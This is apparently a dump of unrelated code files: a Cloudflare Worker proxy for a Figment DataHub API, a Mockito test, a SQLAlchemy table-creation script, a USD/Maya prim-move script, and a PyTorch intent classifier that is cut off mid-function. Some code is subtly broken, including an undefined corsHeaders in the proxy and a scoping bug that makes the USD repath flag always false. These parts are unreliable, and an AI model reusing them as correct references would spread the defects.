name,code
// but does not implement CORS
const API_URL = ""https://SERVICE_NAME.datahub.figment.io""
const WS_API_URL = ""wss://WEBSOCKET_SERVICE_NAME.datahub.figment.io""
const API_AUTH_KEY = ""YOUR_API_KEY_HERE""


// List all of the domains here that you want to be able to access this proxy
const ALLOWED_DOMAINS = [
 'my.example.com'
]


/**
 * Receives a HTTP request, proxies the request, and returns the response. If the request is a websocket requests,
 * it hands the request off to a separate handler for creating a websocket proxy.
 * @param {Request} request
 * @returns {Promise<Response>}
 */
async function handleRequest(request) {
 const { url, headers } = request
 const { host, pathname } = new URL(url)
 const dhURL = API_URL + pathname
 const request_origin = headers.get(""Origin"")


 const origin = request_origin ? new URL(request_origin) : { host: headers.get('Host') }


 if (ALLOWED_DOMAINS.includes(origin.host)){
 let response


 // Websocket requests are identified with an ""Upgrade:websocket"" HTTP header
 const upgradeHeader = request.headers.get(""Upgrade"")
 if (upgradeHeader && upgradeHeader === ""websocket"") {
 const dataHubWebsocketURL = WS_API_URL + pathname
 response = await handleWebsocketRequest(dataHubWebsocketURL)
 } else {
 dataHubRequest = new Request(dhURL, request)
 dataHubRequest.headers.set(""Authorization"", API_AUTH_KEY);
 dataHubRequest.headers.set(""Origin"", new URL(dhURL).origin)
 response = await fetch(dataHubRequest)
 
 // Recreate the response so we can modify the headers
 response = new Response(response.body, response)
 }


 // Set CORS headers
 response.headers.set(""Access-Control-Allow-Origin"", headers.get(""Origin""))


 // Append to/Add Vary header so browser will cache response correctly
 response.headers.append(""Vary"", ""Origin"")


 return response
 }
 else {
 return new Response(""Not Found for "" + host, { status: 404 })
 }
}


/**
 * Receives a HTTP request and replies with a websocket proxy
 * @param {Request} request
 * @returns {Promise<Response>}
 */
 async function handleWebsocketRequest(dataHubWebsocketURL) {
 // Establish the websocket connection to DataHub
 const dataHubResponse = await fetch(dataHubWebsocketURL, { headers: { ""Upgrade"": ""websocket"", ""Authorization"": API_AUTH_KEY } })
 if (dataHubResponse.status !== 101) {
 return new Response(null, {
 status: dataHubResponse.status,
 statusText: dataHubResponse.statusText
 })
 }
 const dataHubSocket = dataHubResponse.webSocket
 dataHubSocket.accept()


 // Create a client/server to act as the proxy layer
 const proxyWebSocketPair = new WebSocketPair()
 const [client, server] = Object.values(proxyWebSocketPair)


 // tell the Workers runtime that it should listen for WebSocket data and keep the connection open with client
 server.accept()


 // Any messages from the client are forwarded to the DataHub socket
 server.addEventListener(""message"", event => {
 dataHubSocket.send(event.data)
 })


 // Any messages coming from DataHub are forwarded back to the client
 dataHubSocket.addEventListener(""message"", event => {
 server.send(event.data)
 })


 const response = new Response(null, {
 status: 101,
 webSocket: client
 })
 
 return response
}


/**
 * Responds with an uncaught error.
 * @param {Error} error
 * @returns {Response}
 */
function handleError(error) {
 console.error('Uncaught error:', error)


 const { stack } = error
 return new Response(stack || error, {
 status: 500,
 headers: {
 'Content-Type': 'text/plain;charset=UTF-8'
 }
 })
}


function handleOptions(request) {
 // Make sure the necessary headers are present
 // for this to be a valid pre-flight request
 let headers = request.headers;
 if (
 headers.get(""Origin"") !== null &&
 headers.get(""Access-Control-Request-Method"") !== null &&
 headers.get(""Access-Control-Request-Headers"") !== null
 ){
 // Handle CORS pre-flight request.
 // If you want to check or reject the requested method + headers
 // you can do that here.
 let respHeaders = {
      ...corsHeaders,
 // Allow all future content Request headers to go back to browser
 // such as Authorization (Bearer) or X-Client-Name-Version
 ""Access-Control-Allow-Headers"": request.headers.get(""Access-Control-Request-Headers""),
 }


 return new Response(null, {
 headers: respHeaders,
 })
 }
 else {
 // Handle standard OPTIONS request.
 // If you want to allow other HTTP Methods, you can do that here.
 return new Response(null, {
 headers: {
 Allow: ""GET, HEAD, POST, OPTIONS"",
 },
 })
 }
}


addEventListener(""fetch"", event => {
 const request = event.request


 if (request.method === ""OPTIONS"") {
 // Handle CORS preflight requests
 event.respondWith(handleOptions(request))
 }
 else if(
 request.method === ""GET"" ||
 request.method === ""HEAD"" ||
 request.method === ""POST""
 ){
 // Handle requests to the API server
 event.respondWith(handleRequest(request))
 }
 else {
 event.respondWith(
 new Response(null, {
 status: 405,
 statusText: ""Method Not Allowed"",
 }),
 )
 }
})
"
"MockitoMultithreadedTest.java
","import org.junit.Test;
import org.mockito.ArgumentCaptor;
import org.mockito.Mockito;


import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


import static org.junit.Assert.assertEquals;
import static org.mockito.Mockito.after;
import static org.mockito.Mockito.verify;


public class MockitoMultithreadedTest {
 @Test
 public void shouldCapture10Arguments() throws Exception {
 final MockObj mockObj = Mockito.mock(MockObj.class);
 ExecutorService exec = Executors.newFixedThreadPool(1);
 exec.submit(() -> {
 for (int j = 0; j < 10; j++) {
 mockObj.method(0);
            }
        });
 ArgumentCaptor<Integer> argumentCaptor = ArgumentCaptor.forClass(Integer.class);
 verify(mockObj, after(1000).atLeastOnce()).method(argumentCaptor.capture());
 List<Integer> captured = argumentCaptor.getAllValues();
 assertEquals(10, captured.size());
    }


 private static class MockObj {
 void method(Integer arg) {
 // void
        }
    }
}
==<SEPERATOR>==
sqlalchemy_dynamic_table_creation.py
from __future__ import (absolute_import, division, print_function,
 unicode_literals)


from sqlalchemy import Column, MetaData, Table, create_engine
from sqlalchemy import String, Integer, Float, BigInteger, DateTime


from sqlalchemy.schema import DropTable, CreateTable
from sqlalchemy.orm import scoped_session, sessionmaker




from contextlib import contextmanager




@contextmanager
def Session(*args, **kwargs):
 Session = scoped_session(sessionmaker(
 bind=create_engine(*args, **kwargs)))


 try:
 session = Session()
 yield session
 session.commit()
 except:
 session.rollback()
 raise
 finally:
 session.close()




def main():
 DB = 'postgresql:///example'


 TABLE_SPEC = [
        ('id', BigInteger),
        ('name', String),
        ('t_modified', DateTime),
        ('whatever', String)
    ]


 TABLE_NAME = 'sample_table'


 columns = [Column(n, t) for n, t in TABLE_SPEC]
 table = Table(TABLE_NAME, MetaData(), *columns)


 with Session(DB, echo=True) as s:
 # this is just here to make the script idempotent
 s.execute('drop table if exists {}'.format(TABLE_NAME))


 table_creation_sql = CreateTable(table)
 s.execute(table_creation_sql)




if __name__ == '__main__':
 main()
==<SEPERATOR>==
usd_sdf_move_prim_spec.py
from pxr import Sdf, Usd


LIST_ATTRS = ['addedItems', 'appendedItems', 'deletedItems', 'explicitItems',
 'orderedItems', 'prependedItems']




def repath_properties(layer, old_path, new_path):
 """"""Re-path property relationship targets and attribute connections.

    This will replace any relationship or connections from old path
    to new path by replacing start of any path that matches the new path.

    Args:
        layer (Sdf.Layer): Layer to move prim spec path.
        old_path (Union[Sdf.Path, str]): Source path to move from.
        new_path (Union[Sdf.Path, str]): Destination path to move to.

    Returns:
        bool: Whether any re-pathing occurred for the given paths.

    """"""


 old_path_str = str(old_path)
 peformed_repath = False


 def replace_in_list(spec_list):
 """"""Replace paths in SdfTargetProxy or SdfConnectionsProxy""""""
 for attr in LIST_ATTRS:
 entries = getattr(spec_list, attr)
 for i, entry in enumerate(entries):
 entry_str = str(entry)
 if entry == old_path or entry_str.startswith(
 old_path_str + ""/""):
 # Repath
 entries[i] = Sdf.Path(
 str(new_path) + entry_str[len(old_path_str):])
 peformed_repath = True


 def repath(path):
 spec = layer.GetObjectAtPath(path)
 if isinstance(spec, Sdf.RelationshipSpec):
 replace_in_list(spec.targetPathList)
 if isinstance(spec, Sdf.AttributeSpec):
 replace_in_list(spec.connectionPathList)


 # Repath any relationship pointing to this src prim path
 layer.Traverse(""/"", repath)


 return peformed_repath




def move_prim_spec(layer, src_prim_path, dest_prim_path):
 """"""Move a PrimSpec and repath connections.

    Note that the parent path of the destination must
    exist, otherwise the namespace edit to that path
    will fail.

    Args:
        layer (Sdf.Layer): Layer to move prim spec path.
        src_prim_path (Union[Sdf.Path, str]): Source path to move from.
        dest_prim_path (Union[Sdf.Path, str]): Destination path to move to.

    Returns:
        bool: Whether the move was successful

    """"""


 src_prim_path = Sdf.Path(src_prim_path)
 dest_prim_path = Sdf.Path(dest_prim_path)
 dest_parent = dest_prim_path.GetParentPath()
 dest_name = dest_prim_path.name
 layer.GetPrimAtPath(dest_prim_path)


 with Sdf.ChangeBlock():
 reparent_edit = Sdf.NamespaceEdit.ReparentAndRename(
 src_prim_path,
 dest_parent,
 dest_name,
 -1
        )


 edit = Sdf.BatchNamespaceEdit()
 edit.Add(reparent_edit)
 if not layer.Apply(edit) and layer.GetPrimAtPath(src_prim_path):
 print(""Failed prim spec move"")
 return False


 repath_properties(layer, src_prim_path, dest_prim_path)


 return True




# Example usage in Maya to move /mtl to /asset/mtl for all
# maya usd proxy shapes in the scene in their current edit target layer
from maya import cmds
import mayaUsd


proxies = cmds.ls(type=""mayaUsdProxyShape"", long=True)
for proxy in proxies:
 stage = mayaUsd.ufe.getStage(""|world"" + proxy)
 layers = stage.GetLayerStack()
 targets = cmds.mayaUsdEditTarget(proxy, query=True, editTarget=True)
 target = targets[0]  # edit target layer identifier


 layer = next(
 layer for layer in stage.GetLayerStack() if layer.identifier == target)


 # Reparent and repath connections and relationships
 move_prim_spec(layer, ""/mtl"", ""/asset/mtl"")


 # Force viewport reset because sometimes viewport doesn't recognize
 # the shader moved
 cmds.ogs(reset=True)
==<SEPERATOR>==
TaskExecution.py
import nltk 
from nltk.stem.porter import PorterStemmer
from torch.utils.data import Dataset,DataLoader
import torch.nn as nn
import json
import torch
import numpy as np 
import random


def TrainTasks():


 class NeuralNet(nn.Module):


 def __init__(self,input_size,hidden_size,num_classes):
 super(NeuralNet,self).__init__()
 self.l1 = nn.Linear(input_size,hidden_size)
 self.l2 = nn.Linear(hidden_size,hidden_size)
 self.l3 = nn.Linear(hidden_size,num_classes)
 self.relu = nn.ReLU()


 def forward(self,x):
 out = self.l1(x)
 out = self.relu(out)
 out = self.l2(out)
 out = self.relu(out)
 out = self.l3(out)
 return out


 Stemmer = PorterStemmer()


 def tokenize(sentence):
 return nltk.word_tokenize(sentence)


 def stem(word):
 return Stemmer.stem(word.lower())


 def bag_of_words(tokenized_sentence,words):
 sentence_word = [stem(word) for word in tokenized_sentence]
 bag = np.zeros(len(words),dtype=np.float32)


 for idx , w in enumerate(words):
 if w in sentence_word:
 bag[idx] = 1


 return bag


 with open(""Data\\Tasks.json"",'r') as f:
 intents = json.load(f)


 all_words = []
 tags = []
 xy = []


 for intent in intents['intents']:
 tag = intent['tag']
 tags.append(tag)


 for pattern in intent['patterns']:
 w = tokenize(pattern)
 all_words.extend(w)
 xy.append((w,tag))


 ignore_words = [',','?','/','.','!']
 all_words = [stem(w) for w in all_words if w not in ignore_words]
 all_words = sorted(set(all_words))
 tags = sorted(set(tags))


 x_train = []
 y_train = []


 for (pattern_sentence,tag) in xy:
 bag = bag_of_words(pattern_sentence,all_words)
 x_train.append(bag)


 label = tags.index(tag)
 y_train.append(label)


 x_train = np.array(x_train)
 y_train = np.array(y_train)


 num_epochs = 1000
 batch_size = 8
 learning_rate = 0.001
 input_size = len(x_train[0])
 hidden_size = 8
 output_size = len(tags)


 print("">> Training The TasksExecution :- Working "")


 class ChatDataset(Dataset):


 def __init__(self):
 self.n_samples = len(x_train)
 self.x_data = x_train
 self.y_data = y_train


 def __getitem__(self,index):
 return self.x_data[index],self.y_data[index]


 def __len__(self):
 return self.n_samples
 
 dataset = ChatDataset()


 train_loader = DataLoader(dataset=dataset,
 batch_size=batch_size,
 shuffle=True,
 num_workers=0)


 device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
 model = NeuralNet(input_size,hidden_size,output_size).to(device=device)
 criterion = nn.CrossEntropyLoss()
 optimizer = torch.optim.Adam(model.parameters(),lr=learning_rate)


 for epoch in range(num_epochs):
 for (words,labels)  in train_loader:
 words = words.to(device)
 labels = labels.to(dtype=torch.long).to(device)
 outputs = model(words)
 loss = criterion(outputs,labels)
 optimizer.zero_grad()
 loss.backward()
 optimizer.step()


 if (epoch+1) % 100 ==0:
 print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {loss.item():.4f}')


 print(f'Final Loss : {loss.item():.4f}')


 data = {
 ""model_state"":model.state_dict(),
 ""input_size"":input_size,
 ""hidden_size"":hidden_size,
 ""output_size"":output_size,
 ""all_words"":all_words,
 ""tags"":tags
    }


 FILE = ""DataBase\\Tasks.pth""
 torch.save(data,FILE)


 print(f""Training Complete, File Saved To {FILE}"")
 print(""             "")


TrainTasks()


def TasksExecutor(query):


 class NeuralNet(nn.Module):


 def __init__(self,input_size,hidden_size,num_classes):
 super(NeuralNet,self).__init__()
 self.l1 = nn.Linear(input_size,hidden_size)
 self.l2 = nn.Linear(hidden_size,hidden_size)
 self.l3 = nn.Linear(hidden_size,num_classes)
 self.relu = nn.ReLU()


 def forward(self,x):
 out = self.l1(x)
 out = self.relu(out)
 out = self.l2(out)
 out = self.relu(out)
 out = self.l3(out)
 return out


 device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')


 with open('Data\\Tasks.json','r') as json_data:
 intents = json.load(json_data)


 FILE = ""DataBase\\Tasks.pth""
 data = torch.load(FILE)


 input_size = data[""input_size""]
 hidden_size = data[""hidden_size""]
 output_size = data[""output_size""]
 all_words = data[""all_words""]
 tags = data[""tags""]
 model_state = data[""model_state""]
